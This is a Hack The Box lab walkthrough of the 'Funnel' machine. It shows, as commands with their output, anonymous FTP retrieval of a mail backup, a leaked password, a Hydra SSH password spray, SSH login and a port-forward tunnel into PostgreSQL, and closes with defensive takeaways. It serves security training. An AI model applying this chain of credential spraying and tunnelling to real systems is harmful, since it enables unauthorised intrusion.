Yooo guys, it's ju4dy the landlord again.

# Funnel — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 1 |
| **Difficulty** | Very easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.228.195` |
| **Skills** | Anonymous FTP, credential reuse, SSH password spraying, local port forwarding, PostgreSQL |

## Overview

Funnel exposes two services: an anonymous FTP server and SSH. The FTP share holds a backup of internal mail,
and one of those documents contains a password that a user was asked to change. The password is still valid,
so it becomes a single-password spray against SSH with a list of usernames.

The spray identifies `christine`, whose account is on the host but whose database is not reachable from
outside: PostgreSQL listens only on `127.0.0.1`. An SSH local port forward puts that database on the attack
host's loopback, and `psql` connects through the tunnel.

## Enumeration

```bash
nmap -sVC 10.129.228.195
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 16:52 +0100
Nmap scan report for 10.129.228.195
Host is up (0.64s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan answers most of the enumeration question before any tool is run: the `ftp-anon` script reports that
anonymous login is allowed and lists a directory named `mail_backup`.

### Anonymous FTP

```bash
ftp -4 10.129.228.195
```

```text
Name (10.129.228.195:jundy): anonymous
230 Login successful.
ftp> ls -la
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
```

The share is a mail archive, kept by the mail server for backup purposes. Changing into `mail_backup` and
retrieving everything with `mget *` downloads the two documents it contains:

```text
ftp> cd mail_backup
ftp> mget *
```

<!-- screenshot: FTP mail_backup directory listing -->

Both files are binary formats, so they are converted to readable text and printed. The interesting content is
in the welcome message, which instructs a new user to change their password and states the password assigned
to them:

```text
funnel123#!#
```

A password that was handed out in plain text over email was evidently never changed.

### Hunting for the username

The password is known but the account is not. A username list is used instead, with the recovered password as
the only candidate. Hydra supports `-L` for a list of logins and a single password with `-p`, which makes this
a spray rather than a brute force:

```bash
hydra -L names.txt -p 'funnel123#!#' ssh://10.129.228.195 -t 8 -W 2 -f -o hydra_hit.txt
```

```text
[DATA] max 8 tasks per 1 server, overall 8 tasks, 10735 login tries (l:10735/p:1), ~1342 tries per task
[DATA] attacking ssh://10.129.228.195:22/
[STATUS] 58.00 tries/min, 58 tries in 00:01h, 10677 to do in 03:05h, 8 active
[STATUS] 52.67 tries/min, 158 tries in 00:03h, 10577 to do in 03:21h, 8 active
[STATUS] 51.40 tries/min, 771 tries in 00:15h, 9964 to do in 03:14h, 8 active
[STATUS] 50.90 tries/min, 1578 tries in 00:31h, 9157 to do in 02:60h, 8 active
[22][ssh] host: 10.129.228.195   login: christine   password: funnel123#!#
[STATUS] attack finished for 10.129.228.195 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

The run took roughly forty minutes, and the progress lines explain why: SSH throttles authentication to about
fifty attempts per minute per host, even with eight parallel tasks (`-t 8`). `-f` stops on the first valid
pair and `-o` records the result so a session can be resumed instead of restarted. Ten thousand names at that
rate is a long lunch, not a runaway attack.

The hit is `christine`. That the password was already in hand means the spray was a lookup, not a guess — a
reminder that unique usernames provide no protection when a password is reused or leaked.

## Foothold — SSH

```bash
ssh christine@10.129.228.195
```

```text
christine@10.129.228.195's password: funnel123#!#
```

<!-- screenshot: christine's shell after SSH login -->

## Pivoting to PostgreSQL

The host runs PostgreSQL, but port `5432` was not in the scan results. That is not an oversight: the database
is bound to the loopback interface, so it only accepts connections that originate on the target itself.
Rather than upload tooling, the connection is tunneled through the SSH session already established:

```bash
ssh -L 5432:127.0.0.1:5432 christine@10.129.228.195
```

`-L` binds port `5432` locally and forwards every connection to `127.0.0.1:5432` *as seen from the target*.
From the attack host the database now appears to be local:

```bash
psql -h 127.0.0.1 -p 5432 -U christine -d postgres
```

<!-- screenshot: psql session as christine -->

From here the task is ordinary database enumeration: list the databases with `\l`, connect with `\c`, and walk
the schemas, tables and rows with `\dt` and `SELECT`.

## Finishing the box

From the `psql` prompt the databases were enumerated as `christine`, and the flag was read from the tables the
application keeps there. The lesson is the chain rather than any single step: anonymous FTP, a password sent
in plain text, and a database that listens only on loopback but trusts anyone who can tunnel to it.

<!-- screenshot: tables enumerated through the psql tunnel -->

## Key takeaways

- **Anonymous FTP should be off unless there is a deliberate reason for it.** A mail backup is one of the
  worst things to expose: it is a plaintext archive of exactly the kind of information attackers want.
- **Passwords sent by email must be treated as compromised.** They should be one-time, expire quickly, and
  force a change at first login. `funnel123#!#` was still active long after the mail was sent.
- **A single leaked password plus a username list is a credential attack.** Rate limiting, key-only
  authentication and alerting on distributed login failures are the controls that break the spray.
- **Database services belong on the loopback interface — but that is not a boundary.** Binding to `127.0.0.1`
  only blocks direct connections; any user with a shell can tunnel through it, as `-L` demonstrates.
- **Watch for what a scan does *not* show.** No `5432` in the results was a clue about the architecture, not
  evidence that no database existed.
